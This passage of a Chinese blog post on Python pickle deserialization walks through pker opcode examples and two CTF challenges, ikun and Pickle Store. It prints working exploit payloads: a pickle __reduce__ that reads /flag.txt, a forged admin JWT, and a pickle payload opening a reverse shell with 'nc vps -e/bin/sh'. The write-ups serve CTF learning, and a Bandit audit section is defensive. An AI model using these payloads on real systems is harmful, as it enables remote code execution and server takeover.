<p>接下来会给出一些具体的基本操作的实例。</p>
<h3 id="pker函数执行">pker：函数执行</h3>
<ul>
<li>通过<code>b'R'</code>调用：</li>
</ul>
<pre><code class="hljs py">s=<span class="hljs-string">'whoami'</span>
system = GLOBAL(<span class="hljs-string">'os'</span>, <span class="hljs-string">'system'</span>)
system(s) <span class="hljs-comment"># `b'R'`调用</span>
<span class="hljs-keyword">return</span></code></pre>
<ul>
<li>通过<code>b'i'</code>调用：</li>
</ul>
<pre><code class="hljs py">INST(<span class="hljs-string">'os'</span>, <span class="hljs-string">'system'</span>, <span class="hljs-string">'whoami'</span>)</code></pre>
<ul>
<li>通过<code>b'c'</code>与<code>b'o'</code>调用：</li>
</ul>
<pre><code class="hljs py">OBJ(GLOBAL(<span class="hljs-string">'os'</span>, <span class="hljs-string">'system'</span>), <span class="hljs-string">'whoami'</span>)</code></pre>
<ul>
<li>多参数调用函数</li>
</ul>
<pre><code class="hljs py">INST(<span class="hljs-string">'[module]'</span>, <span class="hljs-string">'[callable]'</span>[, par0,par1...])
OBJ(GLOBAL(<span class="hljs-string">'[module]'</span>, <span class="hljs-string">'[callable]'</span>)[, par0,par1...])</code></pre>
<h3 id="pker实例化对象">pker：实例化对象</h3>
<ul>
<li>实例化对象是一种特殊的函数执行</li>
</ul>
<pre><code class="hljs py">animal = INST(<span class="hljs-string">'__main__'</span>, <span class="hljs-string">'Animal'</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'2'</span>)
<span class="hljs-keyword">return</span> animal


<span class="hljs-comment"># 或者</span>

animal = OBJ(GLOBAL(<span class="hljs-string">'__main__'</span>, <span class="hljs-string">'Animal'</span>), <span class="hljs-string">'1'</span>,<span class="hljs-string">'2'</span>)
<span class="hljs-keyword">return</span> animal</code></pre>
<ul>
<li>其中，python原文件中包含：</li>
</ul>
<pre><code class="hljs py"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, category</span>):
        self.name = name
        self.category = category</code></pre>
<ul>
<li>也可以先实例化再赋值：</li>
</ul>
<pre><code class="hljs py">animal = INST(<span class="hljs-string">'__main__'</span>, <span class="hljs-string">'Animal'</span>)
animal.name=<span class="hljs-string">'1'</span>
animal.category=<span class="hljs-string">'2'</span>
<span class="hljs-keyword">return</span> animal</code></pre>
<p><strong>手动辅助</strong></p>
<ul>
<li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li>
<li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li>
</ul>
<h2 id="84-ctf实战">8.4 CTF实战</h2>
<ul>
<li>在实际使用pker时，首先需要有大概的思路，保证能做到手写每一步的opcode，然后使用pker对思路进行实现。</li>
</ul>
<h3 id="ciscn2019-华北赛区-day1-web2ikun">[CISCN2019 华北赛区 Day1 Web2]ikun</h3>
<p>首先是一个脚本爆破</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231117205221800.png" alt="image-20231117205221800"></p>
<p>首页告诉我们要卖到lv6，那我们首先得找到它，由于页面很多，手动不现实，故此需要脚本找</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2000</span>):
    time.sleep(<span class="hljs-number">0.5</span>)
    url = <span class="hljs-string">'http://dfb21cdf-d431-4926-b0fa-b5d1905ac641.node4.buuoj.cn:81/shop?page={}'</span>.<span class="hljs-built_in">format</span>(i)
    res = requests.get(url)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'lv6.png'</span> <span class="hljs-keyword">in</span> res.text:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"找到lv6----{}"</span>.<span class="hljs-built_in">format</span>(i))</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231117205950545.png" alt="image-20231117205950545"></p>
<p>如上图在181页，我们访问看看，我们在结算的时候抓包看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231117205832323.png" alt="image-20231117205832323"></p>
<p>如上图我们修改折扣进行购买，随后看到右侧有个重定向，我们访问看看b1g_m4mber</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231117205907430.png" alt="image-20231117205907430"></p>
<p>看到这里只允许admin访问，又看到其中有jwt，那毫无疑问就是伪造jtw了，那首先我们先要拿到secret，这里也是看wp发现是通过爆破找到secret的，直接上工具：</p>
<p>github链接<code>https://github.com/brendan-rius/c-jwt-cracker</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231117222052443.png" alt="image-20231117222052443"></p>
<p>用法这里就不赘述了，如上图可以看到secret是1Kun</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231117222213855.png" alt="image-20231117222213855"></p>
<p>如上图进行伪造之后发送到bp：</p>
<pre><code class="hljs plaintext">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.sxEqhTA_xPDDL_4t8tiMNUIALRjMHxFOsKkzUOc1MPA</code></pre>
<p>发送之后是如下页面：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231118092031351.png" alt="image-20231118092031351"></p>
<p>成功以admin身份登录，接下来看一下源代码发现存在www.zip我们下载看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231118092024158.png" alt="image-20231118092024158"></p>
<p>如果我们上述成功的话，就会得到源码，我们找到Admin.py看到如下代码</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> tornado.web
<span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler
<span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> urllib
 
 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminHandler</span>(<span class="hljs-title class_ inherited__">BaseHandler</span>):
<span class="hljs-meta">    @tornado.web.authenticated</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, *args, **kwargs</span>):
        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">"admin"</span>:
            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number">0</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'no_ass.html'</span>)
 
<span class="hljs-meta">    @tornado.web.authenticated</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self, *args, **kwargs</span>):
        <span class="hljs-keyword">try</span>:
            become = self.get_argument(<span class="hljs-string">'become'</span>)
            p = pickle.loads(urllib.unquote(become))
            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=p, member=<span class="hljs-number">1</span>)
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number">0</span>)</code></pre>
<p>分析可以知道，只有我们用户为admin，随后向become进行传参，内容为序列化内容之后由于render的存在，我们可以执行恶意代码，payload如下</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> urllib

<span class="hljs-keyword">class</span> <span class="hljs-title class_">pop</span>(<span class="hljs-title class_ inherited__">object</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span>(<span class="hljs-built_in">eval</span>, (<span class="hljs-string">"open('/flag.txt', 'r').read()"</span>, ))

poc = pop()
s = pickle.dumps(poc)
<span class="hljs-built_in">print</span>(urllib.qoute(s))<span class="hljs-comment">#注意上述题目中的p参数是经过urllib.unquote函数处理的</span></code></pre>
<p>之后在python2环境下运行，向become传参即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231118094613051.png" alt="image-20231118094613051"></p>
<p>这里点击页面的一键成为大会员之后抓包，修改become参数，拿到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231118094606060.png" alt="image-20231118094606060"></p>
<h4 id="bandit-自动化工具">Bandit-自动化工具</h4>
<p>Bandit 是一款旨在查找 Python 代码中常见安全问题的工具。为此，Bandit 处理每个文件，从中构建 AST，并针对 AST 节点运行适当的插件。一旦 Bandit 完成扫描所有文件，它就会生成一份报告。</p>
<p>我们可以利用上述工具来进行自动的代码审计，看看上述工具是否可以分析出来源码中含有pickle漏洞</p>
<pre><code class="hljs plaintext">bandit -r 需要分析的文件路径</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231214120623360.png" alt="image-20231214120623360"></p>
<p>如上图，的确跟我们手工分析的注入点一致</p>
<h3 id="watevrctf-2019pickle-store">[watevrCTF-2019]Pickle Store</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231118112325674.png" alt="image-20231118112325674"></p>
<p>刚开始提示我们要买pickle这个东西，但我用bp抓包只是发现了cookie以及id在变化，看着像base64，但解密却是一堆乱码，于是看了wp发现这是先pickle序列化后在base解密的，那就好办了，写一个简单脚本即可</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> base64

result = <span class="hljs-string">'gAN9cQAoWAUAAABtb25leXEBS2RYBwAAAGhpc3RvcnlxAl1xAyhYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQRYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQVYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQZYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQdlWBAAAABhbnRpX3RhbXBlcl9obWFjcQhYIAAAADU3YzExYTRmMTE4YmM2Yzc5YmFmNjI2NWE5MWI5NWQwcQl1Lg=='</span>
result = base64.b64decode(result)
result = pickle.loads(result)
<span class="hljs-built_in">print</span>(result)</code></pre>
<p>解密出来为：</p>
<pre><code class="hljs py">{<span class="hljs-string">'money'</span>: <span class="hljs-number">100</span>, <span class="hljs-string">'history'</span>: [<span class="hljs-string">'Yummy smörgåsgurka'</span>, <span class="hljs-string">'Yummy smörgåsgurka'</span>, <span class="hljs-string">'Yummy smörgåsgurka'</span>, <span class="hljs-string">'Yummy smörgåsgurka'</span>], <span class="hljs-string">'anti_tamper_hmac'</span>: <span class="hljs-string">'57c11a4f118bc6c79baf6265a91b95d0'</span>}</code></pre>
<p>这里看到个hmac搜了搜是个算法什么的，也没具体了解就看wp了，这里他们说这种算法也没法利用了，可以直接将一段恶意的pickle代码base64编码后放到cookie进行getshell。因为这里是buu环境，内部靶机不出网，所以也懒得去开小号啥的，就看个思路，payload如下：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-title class_ inherited__">object</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span>(<span class="hljs-built_in">eval</span>, (<span class="hljs-string">"__import__('os').system('nc vps -e/bin/sh')"</span>,))

pop = Demo()
<span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(pop)))

<span class="hljs-comment">#输出</span>
<span class="hljs-string">b'gASVRwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwrX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIHZwcyAtZS9iaW4vc2gnKZSFlFKULg=='</span></code></pre>
<p>之后反弹成功进行getshell即可</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/h3zh1/p/12698897.html">https://www.cnblogs.com/h3zh1/p/12698897.html</a></p>
<p>其他方法可也参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7320">https://xz.aliyun.com/t/7320</a></p>
<p>总的来说，学phar反序列化任重而道远，虽然总结了这么多，但消化的感觉挺少，以后会多找点这种题目的，继续更新这篇文章（毕竟质量太辣鸡）</p>
<h1 id="0x09-参考文章">0x09 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436#toc-12">pickle反序列化初探</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11082#toc-2">Python反序列化漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11807">最近碰到的 Python pickle 反序列化小总结</a> – pickle pass可参考</p>
<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069">Pickle反序列化</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7320">利用python反序列化覆盖秘钥——watevrCTF-2019:Pickle Store的第二种解法</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/11/14/pickle-fan-xu-lie-hua-xue-xi/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/11/14/pickle-fan-xu-lie-hua-xue-xi/')">Pickle反序列化</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/11/14/pickle-fan-xu-lie-hua-xue-xi/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Pickle反序列化&amp;url=http://hybcx.xyz/2023/11/14/pickle-fan-xu-lie-hua-xue-xi/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>基本知识<span class="tagsPageCount">21</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Phar反序列化</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/19/hui-bian-ji-chu-zhi-ling/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">汇编基础指令</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/07/27/ajax-xiang-jie/" title="Ajax详解"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-07-27</div><div class="title">Ajax详解</div></div></a></div><div><a href="/2023/11/12/flask-pin-ma-xue-xi/" title="Flask-PIN码学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-11-12</div><div class="title">Flask-PIN码学习</div></div></a></div><div><a href="/2023/08/06/docker-jian-jie/" title="docker基础"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-08-06</div><div class="title">docker基础</div></div></a></div><div><a href="/2024/02/27/jwt-gong-ji-xue-xi/" title="JWT攻击学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-27</div><div class="title">JWT攻击学习</div></div></a></div><div><a href="/2024/04/09/php-opcachegetshell/" title="PHP-OPcacheGetshell学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-04-09</div><div class="title">PHP-OPcacheGetshell学习</div></div></a></div><div><a href="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/" title="Phar反序列化"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-11-13</div><div class="title">Phar反序列化</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E7%AE%80%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">0x02 简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-pickle"><span class="toc-number">3.</span> <span class="toc-text">0x03 Pickle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#31-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-%E5%8F%AF%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 可序列化的对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#33-object__reduce__-%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 object.__reduce__() 函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#34-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#__reduce__"><span class="toc-number">3.4.1.</span> <span class="toc-text">__reduce__()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#__setstate__"><span class="toc-number">3.4.2.</span> <span class="toc-text">__setstate__()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#__getstate__"><span class="toc-number">3.4.3.</span> <span class="toc-text">__getstate__()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#35-%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-number">3.5.</span> <span class="toc-text">3.5 简单使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#351-%E5%BA%8F%E5%88%97%E5%8C%96%E6%93%8D%E4%BD%9C"><span class="toc-number">3.5.1.</span> <span class="toc-text">3.5.1 序列化操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#352-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%93%8D%E4%BD%9C"><span class="toc-number">3.5.2.</span> <span class="toc-text">3.5.2 反序列化操作</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-pickle%E8%BF%87%E7%A8%8B%E8%AF%A6%E7%BB%86%E8%A7%A3%E8%AF%BB"><span class="toc-number">4.</span> <span class="toc-text">0x04 Pickle过程详细解读</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#41-%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 执行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#42-opcode%E7%AE%80%E4%BB%8B"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 opcode简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#43-%E6%8C%87%E4%BB%A4%E9%9B%86"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 指令集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#44-pickletools"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 Pickletools</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#45-%E4%BE%8B%E5%AD%90-%E6%96%87%E5%AD%97%E8%AF%B4%E6%98%8E"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 例子-文字说明</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">0x05 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#51-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">5.1.</span> <span class="toc-text">5.1 漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#52-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">5.2.</span> <span class="toc-text">5.2 利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 